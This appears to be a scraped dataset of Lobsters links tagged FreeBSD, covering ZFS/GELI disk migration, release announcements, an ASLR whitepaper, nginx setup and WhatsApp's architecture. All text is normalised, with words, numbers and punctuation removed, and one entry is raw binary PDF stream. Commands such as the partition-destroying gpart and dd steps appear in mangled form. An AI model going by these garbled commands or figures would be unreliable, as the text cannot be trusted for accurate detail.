632,Lobsters,freebsd,FreeBSD,Pure ZFS and GELI migration to UEFI,https://www.glenbarber.us/2014/08/02/FreeBSD-Pure-ZFS-and-GELI-migration-to-UEFI.html,pure zfs geli migration uefi,freebsd pure zfs geli migration uefi ath zfs disclaimer zfs zfs geli geom zfs zpool zpool geli dd dd ath,freebsd pure zfs geli migration uefi past several year using asus laptop primary machine great machine ath wireless network card supported ram requirement mine since wanted use full zfs setup everything considered requirement unfortunately back lcd panel cracked recently making screen increasingly difficult work crack location made fullsize terminal impossible use result screen crack age decided finally time upgrade main system get new laptop ended purchasing asus however see disclaimer modern system use efi place traditional bios nonblog entry cover converted zfs system efibootable system without losing data note however way laptop configured nontraditional expect people lucky conversion say laptop configuration nontraditional express enough use zfs exclusively additionally hard drive encrypted using geli backend geom provider since use separate device removable usb flash drive provide kernel system boot partition need remain unencrypted since kernel life order encrypt entire root filesystem still allow system boot attached drive boot created entirely separate zfs dataset several year ago initially installation first laptop hard drive created separate zpool separate gpt partition case partition looked like gpart show gpt free freebsdboot free freebsdzfs freebsdswap freebsdzfs free may seem overkill boot partition learned futureproofing requirement good practice meaning even accident freebsd kernel exceeds would repartition drive reinstall restore everything backup sound like fun weekend activity right system two zpool datasets boot bit lived rest data lived system boot bootloader readable bios boot encrypted kernel loaded system boot prompted passphrase decrypt geli provider system running boot made available running system upgrade file boot directory need updated part upgrade would mounted realboot avoid clobbering filesystem mounted resulting hierarchy looked something like bin boot realbootboot usr fullyencrypted except boot system happy course get new laptop replace one cracked screen relevant especially regarding old laptop well way set original partition allowed evil thing convert drive way would allow efibooting thanks freebsd foundation much work gone supporting uefi modern hardware problem thought want partition drive reinstall restore backup time consuming especially simple hard drive swap new laptop fortunately completely separate boot start saved reinstalling zfs send zfs recv mirrored drive please note command listed may bit different reality since forgot save command history rebooting intentionally installed one two drive new laptop absolutely certain could local restore second drive anything bad stupid part happened part drive going messing center drive start end first downloaded latest memstickimg snapshot already support uefi least get image boot conversion go fine theory booted memstickimg installer prompt selected live cd menu start shell memory stick created directory could use mount part filesystem needed mkdir p imported zfs dataset create backup changing layout disk kldload zfs zfs import f mount rw mkdir p rootbootbackup cd tmpmnt tar czf confirming backup contained file needed destroyed gpt partition dataset zpool export gpart delete specification efi suggest minimum size boot partition spirit futureproofing created efi partition safe also specify starting block since efi partition need start disk used output gpart list figure next free block would gpart add efi b partition created actually start aligning partition boundary created partition would serve boot loader loaderconf kernel gpart add freebsdufs b ufs partition created filesystem needed created file written efi partition first dataset need imported boot directory extracted backup kldload geomeli geli attach zpool import f created new filesystem mounted root filesystem newfs mount cd tar xzf finally needed written efi partition dd point everything seemed sane enough able boot test laptop unmounted filesystems imported test boot umount zpool export reboot actually quite surprised thing worked laptop rebooted internal hard drive laptop booted fine first drive time add second drive laptop booted memstickimg want system accidentally boot wrong dataset point filesystem effectively splitbrain state selected live cd installer prompt attached second drive since geomeliko automatically loaded memstickimg need worry system automatically importing zfs dataset want happen destroyed gpt partition second drive point could certain drive already converted newlyattached drive gpart show lacked efi partition rather specifying partition index number forcefully destroyed gpt scheme disk gpart destroy f dumped scheme first drive onto second gpart backup gpart restore l verified partition layout drive matched going gpart show partition layout matched rebooted laptop internal drive system running internal drive time make second drive live particular thing still needed done point write mirror create geli provider root filesystem add dataset file written efi partition second drive first dd created geli provider mirror geli init b e aescbc l geli attach dd ifdevrandom dd wrote random data geli provider set mirror realboot partition boot available running system used geommirror gmirror label v b roundrobin gmboot gmirror insert gmboot mirror synchronized updated etcfstab mount devmirrorgmboot realboot directory automaticaly etcfstab entry look like devmirrorgmboot realboot ufs rw noatime dd finished writing random data geli provider could add dataset let resilver zpool attach used zpool status verify pool new geli provider example output taken mirror already finished resilvering zpool status pool state online scan resilvered error sun aug config name state read write cksum online online online online error known data error resilver finished rebooted laptop one last time selecting second drive boot drive quick test system booted fine realize everyone seemingly smooth conversion ueficapable system without needing repartition entire drive turn using zfs setup encrypted filesystem made conversion quite painless purchased asus laptop previous laptop made asus however ever buy another asus several inquiry customer service went unanswered reason longer purchase dell laptop next time get lenovo assuming ath wireless network card
633,Lobsters,freebsd,FreeBSD,PostgreSQL/FreeBSD performance and scalability on a 40-core machine,https://www.kib.kiev.ua/kib/pgsql_perf_v2.0.pdf,postgresqlfreebsd performance scalability machine,,obj length filter flatedecode stream 愒 e ne xǐ q endstream endobj obj length filter flatedecode stream ou r b endstream endobj obj length filter flatedecode stream u z c li l b l endstream endobj obj length filter flatedecode stream qu f ۆp ug v f uf h x r ib endstream endobj obj length filter flatedecode stream ǔ dlm g endstream endobj obj length filter flatedecode stream l ՙ j p c z
634,Lobsters,freebsd,FreeBSD,BSDSec - deadsimple BSD Security Advisories and Announcements,http://bsdsec.net,bsdsec deadsimple bsd security advisory announcement,,
635,Lobsters,freebsd,FreeBSD,EuroBSDcon 2014 Talks and Schedule,http://2014.eurobsdcon.org/talks-and-schedule/,eurobsdcon talk schedule,introduction freebsd transition openbsd bsda certification exam introduction freebsd let make manual useful,introduction freebsd opensource operating system filesystems overview kirk mckusick transition openbsd peter hansteen freebsd devsummit invitation coffee break continued filesystems overview kirk mckusick continued transition openbsd cont peter hansteen freebsd devsummit invitation bsda certification exam lunch break introduction freebsd opensource operating system networking implementation kirk mckusick let make manual useful ingo schwarze freebsd devsummit invitation netbsd devsummit invitation coffee break continued opensource operating system networking implementation kirk mckusick continued let make manual useful ingo schwarze freebsd devsummit invitation netbsd devsummit invitation
636,Lobsters,freebsd,FreeBSD,FreeBSD 9.3-RELEASE Announcement,http://www.freebsd.org/releases/9.3R/announce.html,freebsd announcement,freebsd announcement availability ftp support project based freebsd acknowledgment trademark iso image checksum donation,freebsd announcement freebsd release engineering team pleased announce availability freebsd fourth release branch improves stability freebsd introduces new feature highlight zfs filesystem updated support bookmark feature uname utility updated include u k flag print freebsdversion running userland kernel respectively fetch library updated support sni server name identification allowing use virtual host http several update gcc imported google hastctl utility updated output current queue size protect command added allows exempting process killed swap exhausted etcupdate utility tool managing update file etc merged head new shared library directory usrlibprivate added internaluse shared library openpam updated nummularia new flag onifconsole added etcttys allows system provide login prompt via serial console device active kernel console otherwise equivalent sendmail updated version bind updated version xz utility updated snapshot openssh updated version openssl updated version complete list new feature known problem please see online release note erratum list available information freebsd release engineering activity please see availability freebsd available powerpc architecture freebsd installed bootable iso image network architecture also support installing usb memory stick required file downloaded via ftp described section smaller ftp mirror may carry architecture generally contain common one hash release iso memory stick image included bottom message pgpsigned version announcement available purpose image provided part release follows contains everything necessary install base freebsd operating system documentation small set prebuilt package aimed getting graphical workstation running also support booting livefs based rescue mode need burn use dvdsized medium contains base freebsd operating system also support booting livefs based rescue mode prebuilt package bootonly support booting machine using cdrom drive contain installation distribution set installing freebsd cd would need perform network based install eg ftp server booting cd memstick written usb memory stick flash drive used install machine capable booting usb drive also support booting livefs based rescue mode prebuilt package one example use memstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct minimemstick written usb memory stick flash drive used boot machine contain installation distribution set medium similar bootonly image also support booting livefs based rescue mode prebuilt package one example use minimemstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct freebsd also purchased cdrom dvd several vendor one vendor offering freebsd product ftp freebsd may downloaded via ftp following site however trying site please check regional mirror first going additional mirror site labeled information freebsd mirror site found instruction installing freebsd updating existing machine please see support freebsd supported january endoflife date found project based freebsd many third party project based freebsd project range repackaging freebsd novice friendly distribution making freebsd available amazon infrastructure information third party project see acknowledgment many company donated equipment network access manhours support release engineering activity freebsd including freebsd foundation yahoo netapp internet system consortium bytemark hosting sentex communication new york internet juniper network nlnet lab ixsystems yandex release engineering team includes trademark freebsd registered trademark freebsd foundation iso image checksum powerpc love freebsd support future release donation freebsd foundation
637,Lobsters,freebsd,FreeBSD,Nginx on FreeBSD,http://www.cambus.net/nginx-on-freebsd/,nginx freebsd,nginx freebsd nginx freebsd nginx freebsd nginx package debian stable installing nginx via pkg installing nginx using port collection lua module starting nginx,nginx freebsd nginx freebsd purprose article mostly show easy compile run custom build nginx freebsd including third party module automatically fetched built comprehensive list compile time option included module debian ubuntu package check following article nginx package debian stable installing nginx via pkg default nginx compiled following option nginx version tl sni support enabled configure argument prefixusrlocaletcnginx withccopti usrlocalinclude withldoptl usrlocallib confpathusrlocaletcnginxnginxconf sbinpathusrlocalsbinnginx pidpathvarrunnginxpid errorlogpathvarlognginxerrorlog userwww groupwww httpclientbodytemppathvartmpnginxclientbodytemp httpfastcgitemppathvartmpnginxfastcgitemp httpproxytemppathvartmpnginxproxytemp httpscgitemppathvartmpnginxscgitemp httpuwsgitemppathvartmpnginxuwsgitemp httplogpathvarlognginxaccesslog withhttpstubstatusmodule withpcre withhttpsslmodule installing nginx using port collection cd usrportswwwnginx make config list available configuration option third party module showing lua module highlighted selected compilation configured launch installation clean dependency make install cleandepends starting nginx adding nginxenable directive rcconf echo nginxenable yes etcrcconf launch server manually nginx running launched automatically boot time
638,Lobsters,freebsd,FreeBSD,Whitepaper - Introducing ASLR in FreeBSD,http://lists.freebsd.org/pipermail/freebsd-arch/2014-July/015548.html,whitepaper introducing aslr freebsd,rfc aslr whitepaper candidate final patch lattera gmailcom de freebsdorg alc riceedu bdrewery freebsdorg lattera gmailcom oliverpntr gmailcom http wwwhardenedbsdorg http paxgrsecuritynetdocsaslrtxt http http bugsfreebsdorgbugzillashowbugcgi http http svnwebfreebsdorgbase viewrevision http wwwsoldierxcom http http http information freebsdarch mailing list,rfc aslr whitepaper candidate final patch shawn webb lattera gmailcom fri jul utc hey oliver pinter working hard aslr implementation final stage development would like get feedback community attached email small whitepaper detail implementation accompanying patch one part patch wrote quite ugly hack would like get feedback added little hack sysmmap apply aslr call mmap specified like remove ugly hack something bit beautiful anyone suggestion ear ugly hack code adheres freebsd style standard believe awesome implementation one personally using without issue month looking forward comment question cc pax team please keep cc reply thank much shawn webb cc pax team cc oliver pinter cc de freebsdorg cc alc riceedu cc bdrewery freebsdorg p sorry duplicate email hit wrong key nt cc everyone next part introducing aslr freebsd shawn webb lattera gmailcom oliver pinter oliverpntr gmailcom july http wwwhardenedbsdorg introduction security freebsd based primarily policybased technology existing tool jail capsicum vnetvimage mac framework make freebsdbased system quite resilient attack freebsd lack basic lowlevel exploit mitigation address space layout randomization aslr aslr randomizes address space layout application making exploitation difficult attacker paper associated implementation aim provide secure robust extensible easilymanaged form aslr fit production use within freebsd history may oliver pinter published github initial patch work inspired elad efrat work netbsd patch submitted freebsd bug report aug independently oliver work jun shawn webb posted tech blog interested implementing aslr freebsd oliver found post suggested shawn work together jun preparatory work committed freebsd adding positionindependent executable pie support base apr soldierx agreed sponsor project donated box beaglebone black shawn webb hardware used testing debugging aslr platform general overview aslr enabled default architecture controlled paxaslr kernel option mean aslr applied supported application user wish disable aslr given application user must force application optout detailed later another kernel option paxsysctls expose additional tunables via sysctl allowing aslr behavior control without requiring reboot default sysctl securitypaxaslrstatus changed boot time via bootloaderconf enabling paxsysctls kernel option allows root user modify securitypaxaslrstatus see appendix b list tunables aslr tunables perjail jail inherits parent jail setting perjail tunables allows flexibility sharedhosting environment structure also allows user selectively disable aslr application misbehave aslrdisabled application still policybased security applied virtue jailed macbsdextended mac module corresponding ugidfw application modified allow user enable disable aslr specific application filesys object specification modified pas inode along filesystem id new paxflags option specified paxflags option optionally placed end rule uppercase argument option signifies aslr enabled application lowercase signifies aslr disabled application sample ugidfw rule appendix c implementation detail new sysinit subroutine id sisubpax initializes aslr system variable upon system boot tunables bootloaderconf checked validity invalid value generate warning message console tunable set sensible default sake performance aslr system relies perprocess delta rather calling mapping process call execve aslr system initialized delta randomly generated execution base mmap stack address execution base application compiled pie randomized execution base nonpie application modified mapping shared object randomized pie nonpie application delta used hint virtual memory vm system vm system may modify hint make better fit superpages alignment constraint delta applied pie execbase different delta applied base address shared object executable linkable file elf image handler execution base pie application randomized adding delta controlled securitypaxaslrexeclen tunable etdynaddr initialized etdynloadaddr architecturedependent macro base address shared object loaded runtime linker randomized applying delta controlled securitypaxaslrmmaplen tunable sysmmap stack randomization implemented using stack gap executable image activation stack delta computed subtracted top stack enhancement existing gapbased stack randomization optimal mappingbase stack randomization robust hardcoded kernel structure address especially psstrings need modified required change psstrings major likely touch userland along kernel original pax implementation freebsd implementation inspired us special elf process header requires modification executable file author freebsd implementation deliberately chosen go different route based macbsdextended ugidfw support filesystem extended attribute added later time freebsd virtual dynamic shared object vdso implementation efficient technique calling kernel code userland us hardcoded nonrandomized address vdso implementation reworked randomized address providing address auxiliary vector passed image via stack known issue aslr function properly arm process fork call execve child process exit parent process crash upon receiving sigchld signal matter application crashed pc register end ktrace facility proved application crashed upon receiving sigchld signal appendix reference http paxgrsecuritynetdocsaslrtxt http http bugsfreebsdorgbugzillashowbugcgi http http svnwebfreebsdorgbase viewrevision http wwwsoldierxcom http appendix b aslr tunables note tunables changed boottime via bootloaderconf unless kernel compiled paxsysctls securitypaxaslrstatus integer description toggle systemwide aslr protection value aslr disabled systemwide individual application may opt aslr disabled default individual application may opt aslr enabled default individual application may opt aslr enabled systemwide individual application may opt default securitypaxaslrdebug integer description toggle debugging output value debug output disabled basic debug output enabled verbose debug output enabled default securitypaxaslrmmaplen integer description set number bit randomized mmap call value system minimum maximum system minimum maximum default system system securitypaxaslrstacklen integer description set number bit randomized stack value system minimum maximum system minimum maximum default system system securitypaxaslrexeclen integer description set number bit randomized pie exec base value system minimum maximum system minimum maximum default system system appendix c sample ugidfw rule securitypaxaslrstatus set require application optout ugidfw add subject uid shawn object filesys binls mode rx paxflags add rule disable aslr binls user shawn ugidfw add subject uid object filesys binls mode rx paxflags add rule disable aslr binls user securitypaxaslrstatus set require application optin ugidfw add subject uid shawn object filesys binls mode rx paxflags add rule enable aslr binls user shawn ugidfw add subject uid object filesys binls mode rx paxflags add rule enable aslr binls user appendix file modifiedcreated liblibugidfwugidfwc liblibugidfwugidfwh releasemakefile sysarmarmelfmachdepc sysconfnotes sysconffiles sysconfoptions syskernimgactaoutc syskernimgactelfc syskerninitmainc syskernkernexecc syskernkernforkc syskernkernjailc syskernkernpaxc syskernkernpaxaslrc syskernkernpaxlogc syskernkernsigc sysmipsmipselfmachdepc syssecuritymacbsdextendedmacbsdextendedc syssecuritymacbsdextendedmacbsdextendedh syssecuritymacbsdextendedugidfwinternalh syssecuritymacbsdextendedugidfwsystemc syssecuritymacbsdextendedugidfwvnodec syssysimgacth syssysjailh syssyskernelh syssyspaxh syssysproch syssyssysenth sysvmvmmapc sysvmvmmaph sysvmvmmmapc usrsbinugidfwugidfwc next part nontext attachment scrubbed name type textxdiff size byte desc available url http next part nontext attachment scrubbed name available type applicationpgpsignature size byte desc available url http information freebsdarch mailing list
639,Lobsters,freebsd,FreeBSD,Future of pf in FreeBSD - does it have one?,http://lists.freebsd.org/pipermail/freebsd-pf/2014-July/007391.html,future pf freebsd one,future pf freebsd one freebsd comjkkndk http undeadlyorgcgi actionarticle information freebsdpf mailing list,future pf freebsd one kristian k nielsen freebsd comjkkndk tue jul utc hi happy user pffirewall module year think really great lately getting bit dusty last year however seem pf freebsd got long way away pf openbsd originated also continually watching freebsd go ipfilter ipf ipfw dead curious mailing could elaborate future pf freebsd first actively developing pf freebsd b major release away openbsd coming soon following openbsd pf past c never got new syntax openbsd pf still blocking u anyone working bringing freebsd e openbsd retiring altq entirely thought http undeadlyorgcgi actionarticle f support seem challenged current version pf freebsd well others introducing network ex bug seriously bug handling fragment open since workaround necessity leave open hole firewall ruleset allow fragment occoring comment bug long gone openbsd hope heard best regard kristian kræmmer nielsen odense denmark information freebsdpf mailing list
640,Lobsters,freebsd,FreeBSD,FreeBSD bug tracking moves from GNATS to Bugzilla,https://lists.freebsd.org/pipermail/freebsd-announce/2014-June/001559.html,freebsd bug tracking move gnat bugzilla,freebsdannounce freebsd bug tracking move gnat bugzilla theraven freebsdorg http bugsfreebsdorgbugzilla http peoplefreebsdorgeadlerbugrelocationworkflowhtml bugmeister freebsdorg information freebsdannounce mailing list,freebsdannounce freebsd bug tracking move gnat bugzilla david chisnall theraven freebsdorg tue jun utc pleased announce freebsd project begin transition gnat bugtracking system bugzilla bugzilla installation found http bugsfreebsdorgbugzilla process expected cause disruption come several benefit bugzilla unlike gnat actively maintained used number project similar size scope freebsd hope user familiar project learn yet another bugtracking system file bug freebsd bugzilla support finer granularity category keywords time adopt making easier filter bug specific target area easy multiple people track single bug without assigned custom mailing list add attachment bug many feature people expect modern bug tracker simply present gnat bugzilla migration come several change workflow illustrated state transition diagram http peoplefreebsdorgeadlerbugrelocationworkflowhtml interaction bug tracker happen via web interface sendpr script continue functioning compatibility interface guaranteed run timely fashion currently importing bug submitted via sendpr involves manual step addition command line tool available develpybugz package going forward bugzilla modern platform integrating tool example code review system allow u improve workflow regular freebsd committers contributor please warned likely disruption process find specific problem please file bug bugzilla search function work well also easily check duplicate file new issue issue encounter ca nt file bug please send email bugmeister freebsdorg behalf core many thanks people made possible please nice nt much sleep recently david information freebsdannounce mailing list
642,Lobsters,freebsd,FreeBSD,OpenSSL end of life,http://lists.freebsd.org/pipermail/freebsd-security/2014-June/007784.html,openssl end life,openssl end life ben linksorg information freebsdsecurity mailing list,openssl end life ben laurie ben linksorg wed jun utc openssl team considering aggressive eol strategy particular may eol right come currently beta going forward would maintain two version come would eol people think information freebsdsecurity mailing list
644,Lobsters,freebsd,FreeBSD,BSDCan 2014 Videos Online,http://undeadly.org/cgi?action=article&sid=20140528143344,bsdcan video online,,contributed tbert video killedtheradio star dept
646,Lobsters,freebsd,FreeBSD,"PC Engines apu system boards (3x GigE, AMD Bobcat, 2 or 4GB of DDR3) now in production",http://pcengines.ch/apu.htm,pc engine apu system board gige amd bobcat production,coreboot,apu platform summary pc engine apu system board big step performance capacity popular alix series please consider platform longer term availability application router firewall voip dedicated server special purpose network plumbing education tool cpu amd g series apu ghz dual core bobcat core bit support data instruction cache per core dram gb dram bit bus storage boot sd card connected usb external usb msata ssd sata data power connector power dc power depending cpu load expansion minipci express one sim socket modem lpc bus gpio header bus rxdtxd connectivity gigabit ethernet realtek serial port console firmware coreboot open source system bios support ipxe usb boot form factor x mm fit u enclosure cooling conductive cooling cpu south bridge enclosure using mm alu heat spreader please contact u advice want integrate board enclosure model gb dram gb dram status production pc engine gmbh right reserved
647,Lobsters,freebsd,FreeBSD,Does OpenBSD/FreeBSD support Minix?,http://www.newegg.com/Product/Product.aspx?Item=N82E16856178005,openbsdfreebsd support minix,content footer click link email u neweggcom computer part laptop electronics hdtv digital camera learn general cpu supported graphic communication front panel port back panel port feature additional information read full detail standard return policy show detail product download adobe reader adobe web site,skip content footer neweggcom great place buy computer computer part electronics software accessory dvd online great price fast shipping toprated customer service newegg shopping upgraded reading message please click link reload page use browser refresh button please email u running latest version browser still see message neweggcom computer part laptop electronics hdtv digital camera see message web browser nt support javascript javascript disabled please enable javascript browser setting neweggcom function correctly open box image shown new version item reference actual open box product may differ packaging included accessory tested ensure basic functionality minix x hdmi smart medium hub sold shipped newegg marketplace seller rockchip dualcore cortex quad core mali loading spec warranty return q learn minix supportedcpu typerockchip dualcore cortex videoquad core mali lan panel portscard readersdmmc card reader sd mmc back panel x hdmirear x usb rear portsir receiverfeaturesremote nand flashos android jelly bean dc adapter included ce fcc ccc certified supported video format vcd format vob dvd format etc supported audio format etcadditional informationdate first availableaugust warranty return additional information warranty limited warranty period part year limited warranty period labor year read full detail return policy return refund within day return replacement within day item covered neweggcom standard return policy newegg eggxpert review program newegg invite best reviewer known eggxperts post opinion new prerelease product help fellow customer make informed buying decisionsclick detail loading select option continue thank subscribing request processed within next hour please add promo promoneweggcom address book ensure delivery shop without retyping payment detail secure shopping made fastercheck paypal price available checkout show detail product manufacturer place restriction detail product may communicated adobe reader appear click link pdf file download adobe reader adobe web site
649,Lobsters,freebsd,FreeBSD,Call For Testing: ASLR and PIE on FreeBSD/amd64,http://lists.freebsd.org/pipermail/freebsd-current/2014-March/049013.html,call testing aslr pie,cft aslr pie lattera gmailcom http githubcomlatterafreebsd information freebsdcurrent mailing list,cft aslr pie shawn webb lattera gmailcom sat mar utc hey first hope even noncommitter okay post call testing please excuse newbishness process first time submitting major patch upstream freebsd past month opportunity pleasure enhance existing patch freebsd implement common exploit mitigation technology called address space layout randomization aslr along support position independent executables pie aslrpie longrequested feature many people met irc submitted patch pr currently process adding pie support certain highvisibility application base mainly network daemon added makeconf knob default enabled application also explicitly support pie well defining canpie makefile prior including bsdprogmk get decent amount application enabled pie support submit one last patch following sysctl set kernel compiled paxaslr option securitypaxaslrstatus securitypaxaslrdebug securitypaxaslrmmaplen securitypaxaslrstacklen securitypaxaslrexeclen securitypaxaslrstatus sysctl enables disables aslr system whole debug sysctl give debugging output mmaplen sysctl tell aslr system many bit randomize mmap called stacklen sysctl tell aslr system many bit randomize stack execlen sysctl tell aslr system many bit randomize execbase control pie sysctls set perjail basis application nt support aslr yet want aslr enabled everything else simply place misbehaving application jail jail aslr setting turned please let know testing go giving presentation bsdcan regarding want keep tab bleedingedge development process please follow progress github http githubcomlatterafreebsd branch soldierxlatteraaslr thank much shawn webb information freebsdcurrent mailing list
650,Lobsters,freebsd,FreeBSD,[CFT] Replace Fedora 10 with CentOS 6.5 as Base Linux distro.,http://lists.freebsd.org/pipermail/freebsd-ports/2014-March/090658.html,cft replace fedora centos base linux distro,cft replace fedora centos base linux distro xmj chaotnet http githubcomxmjlinuxports xmj chaotnet http xmjme http information freebsdports mailing list,cft replace fedora centos base linux distro johannes meixner xmj chaotnet wed mar utc commit http githubcomxmjlinuxports github repository well respective txz diffxz linked earlier thread contain full copy every working linux application way used depends linux rpm apps repo defaulting centos lead porting whole lot centos nonbase port coming epel extra package enterprise linux repository list obtained commit log deemed necessary result available linux software work default new one include goody matlab google earth thunderbird seeamonkely id software game quake quake doom enemy territory well unreal unreal tournament series unreal gold unreal tournament demo utserver last least said ca nt possibly test need help come game please install centos base try running game likewise software tree us linux work find bug hope could report issue github best regard johannes meixner xmj chaotnet http xmjme next part nontext attachment scrubbed name available type applicationpgpsignature size byte desc available url http information freebsdports mailing list
651,Lobsters,freebsd,FreeBSD,The WhatsApp Architecture Facebook Bought For $19 Billion,http://highscalability.com/blog/2014/2/26/the-whatsapp-architecture-facebook-bought-for-19-billion.html,whatsapp architecture facebook bought billion,center engagement purpose built apps investment sequoia capital used deal focus messaging privacy facebook chat optimization dark grungy work suitable troll engineer get data need write tool patch tool add knob measure remove bottleneck test repeat erlang rock crack virality code profit value employee count officially divorced something brutal focus user idea limit cause simplicity ok age thing start simply customize keep server count low purposely overprovision hardware growth stall charge money inspiration come strangest place hacker news whatsapp actually worth say facebook zuckerberg internetorg sealed deal,rick reed upcoming talk march titled billion b scaling next level whatsapp reveals eye popping whatsapp stats hundred node thousand core hundred terabyte ram hope serve billion smartphones soon reality around globe erlangfreebsdbased server infrastructure whatsapp faced many challenge meeting evergrowing demand messaging service continue push envelope size core speed erlang message per second serving system since talk yet let take look talk rick reed gave two year ago whatsapp scaling million simultaneous connection built high performance messaging bus c yahoo rick reed new world high scalability architecture founder also exyahoo guy little experience scaling system whatsapp come scaling prowess honestly since big hairy audacious goal every smartphone world could many billion phone year need make experience get fact let digress moment absolutely fascinating conundrum whatsapp possibly worth billion facebook programmer ask whatsapp worth much answer expletive sending stuff network get real also guy thought need blogging platform hard remote login server edit indexhtml file vi write post html taken quite realize code stupid getting user love use product hard part buy love make whatsapp valuable technology ignore people say could write whatsapp week php simply true see pretty cool technology certainly facebook sufficient chop build whatsapp wished let look feature know whatsapp gimmick ad gimmick game product loyal user across world offer free texting cruel world sm charge abusive sheltered american surprised see many real people use whatsapp really stay touch family friend get whatsapp likely people know already since everyone phone mitigates empty social network problem aggressively cross platform everyone know use work work phrase often used full featured shared location video audio picture pushtotalk voicemessages photo read receipt groupchats send message via wifi done regardless whether recipient online handle display native language well using cell number identity contact list social graph diabolically simple email verification username password credit card number required work impressive worth billion product compete feature google wanted possible reason threat cent user facebook desperate phone book metadata even though whatsapp keep none million active user user based growing one million user day potential billion user facebook need whatapp next billion user certainly must part cost user seem unreasonable especially bulk paid stock facebook acquired instagram per user twitter user worth benedict evans make great case mobile trillion dollar business whatsapp disrupting sm part industry globally billion revenue sending billion sm message day global sm system sends billion sm message day fundamental change transition pc nearly universal smartphone adoption size opportunity much larger addressable market facebook normally play facebook promised ad interference win interesting development business use mobile whatsapp used create group conversation project team venture capitalist carry deal flow conversation whatsapp instagram used kuwait sell sheep wechat whatsapp competitor launched taxicab hailing service january first month million cab hailed future ecommerce looking like funneled mobile messaging apps must ecommerce play business using whatsapp application desktop web police officer spain use whatsapp catch criminal people italy use organize basketball game commerce application jumping mobile obvious reason everyone mobile messaging application powerful free cheap use longer need desktop web application get thing done lot functionality overlayed messaging app messaging threat google facebook desktop dead web dying messaging mobile entire ecosystem sidestep channel messaging become center engagement mobile search changing thing found nature application win future prepagerank preweb facebook need get market become irrelevant move mobile seeing deportalization facebook desktop web interface facebook portal style interface providing access feature made available backend big complicated creaky really love facebook ui facebook moved mobile tried portal approach work going strategy smaller focussed purpose built apps mobile first much small screen mobile easier go find special app find menu buried deep within complicated portal style application facebook going one step creating purpose built apps providing multiple competing apps provide similar functionality apps may even share backend infrastructure see messenger whatsapp instagram facebook photo app paper alternate interface facebook provides limited functionality well conway law may operating idea organization design system constrained produce design copy communication structure organization monolithic backend infrastructure get borglike portal design move mobile free organization way thinking apps built provide view slice facebook infrastructure apps built use facebook infrastructure nt need facebook infrastructure free built facebook exactly facebook facebook ceo mark zuckerberg take saying keynote presentation mobile world congress facebook acquisition whatsapp closely related internetorg vision idea develop group basic internet service would free charge use internet could social networking service like facebook messaging service maybe search thing like weather providing bundle free charge user work like gateway drug sort user may able afford data service phone day see point would pay data service would give context important lead paying service like hope go long play game huge reservoir valuable stock allows play reached conclusion think stunning dollar amount tenuous apparent immediate reward long term play explanation actually make sense still early day mobile nobody know future look like pay try force future look like past facebook seems enough support million active user engineer let find source warning know lot whatsapp architecture bit piece gathered various source rick reed main talk optimization process used get million connection server using erlang interesting complete architecture talk stats stats generally current system system talk talk current system include hack data storage messaging metaclustering beamotp patch million active user reached number faster company history engineer one developer support million active user billion message every day across seven platform inbound outbound million people sign every day invested advertising million investment sequoia capital billion amount sequoia make much facebook cash used deal hundred node core hundred terabyte ram erlang message per second whatsapp achieved million established tcp session single machine memory cpu spare pushed million tcp connection whatsapp tweeted dec new record day msg inbound msg outbound billion total message processed one day happy platform backend frontend seven client platform iphone android blackberry nokia symbian nokia window phone sqlite hardware product focus messaging connecting people world regardless world without pay lot money founder jan koum remembers difficult connect family world privacy shaped jan koum experience growing ukraine nothing private message stored server chat history stored goal know little user possible name gender known chat history phone general whatsapp server almost completely implemented erlang server system backend message routing done erlang great achievement number active user managed really small server footprint team consensus largely erlang interesting note facebook chat written erlang went away hard find qualified programmer whatsapp server started ejabberd ejabberd famous open source jabber server written erlang originally chosen open great review developer ease start promise erlang long term suitability large communication system next year spent rewriting modifying quite part ejabberd including switching xmpp internally developed protocol restructuring code base redesigning core component making lot important modification erlang vm optimize server performance handle billion message day focus making reliable system work monetization something look later far far road primary gauge system health message queue length message queue length process node constantly monitored alert sent accumulate backlog beyond preset threshold one process fall behind alerted give pointer next bottleneck attack multimedia message sent uploading image audio video sent http server sending link content along encoded thumbnail applicable code usually pushed every day often multiple time day though general peak traffic time avoided erlang help aggressive getting fix feature production hotloading mean update pushed without restarts traffic shifting mistake usually undone quickly hotloading system tend much looselycoupled make easy roll change incrementally protocol used whatsapp app ssl socket whatsapp server pool message queued server client reconnects retrieve message successful retrieval message sent back whatsapp server forward status back original sender see checkmark icon next message message wiped server memory soon client accepted message registration process work internally whatsapp whatsapp used create usernamepassword based phone imei number changed recently whatsapp us general request app send unique digit pin whatsapp send sm indicated phone number mean whatsapp client longer need run phone based pin number app request unique key whatsapp key used password future call permanent key stored device also mean registering new device invalidate key old device google push service used android user android android enjoyable work developer able prototype feature push hundred million user overnight issue fixed quickly io much quest million connection per server experienced lot user growth good problem also mean spend money buying hardware increased operational complexity managing machine need plan bump traffic example soccer game earthquake spain mexico happen near peak traffic load need enough spare capacity handle peak bump recent soccer match generated spike outbound message rate right daily peak initial server loading simultaneous connection per server extrapolated would mean lot server hoped growth pattern server brittle face burst load network glitch problem would occur needed decouple component thing brittle high capacity goal million connection per server ambitious goal given time running connection running server headroom allow world event hardware failure type glitch would require enough resilience handle high usage level failure tool technique used increase scalability wrote system activity reporter tool wsar record system stats across system including o stats hardware stats beam stats build easy plugin metric system like virtual memory track cpu utilization overall utilization user time system time interrupt time context switch system call trap packet sentreceived total count message queue across process busy port event traffic rate byte inout scheduling stats garbage collection stats word collected etc initially ran minute system driven harder one second polling resolution required event happened space minute invisible really fine grained stats see everything performing hardware performance counter cpu pmcstat dtrace kernel lockcounting fprof dtrace mostly debugging performance patched beam freebsd include cpu time stamp wrote script create aggregated view across process see routine spending time biggest win compiling emulator lock counting turned issue earlier saw time spent garbage collection routine brought saw issue networking stack tuned away issue lock contention emulator show strongly output lock counting measurement result started simultaneous connection per server first bottleneck showed system ran lot contention work stopped instrumented scheduler measure much useful work done sleeping spinning load started hit sleeping lock cpu used across system scheduler utilization first round fix got million connection vm usage cpu beam emulator running utilization match closely user percentage good emulator run user ordinarily cpu utilization good measure busy system scheduler us cpu month later tackling bottleneck million connection per server achieved beam utilization close freebsd might start paging cpu double connection scheduler hitting contention running pretty well seemed like good place stop started profiling erlang code peaked connection per server tried million connection failed see long message queue system trouble either single message queue sum message queue added beam instrumentation message queue stats per process many message sentreceived fast sampling every second could see process message message queue dequeue rate delay second projected drain time second finding erlang beam fix awesome smp scalability nearly linear scalability remarkable box run system cpu utilization keeping running production load run like day testament erlang program model longer server accumulate long 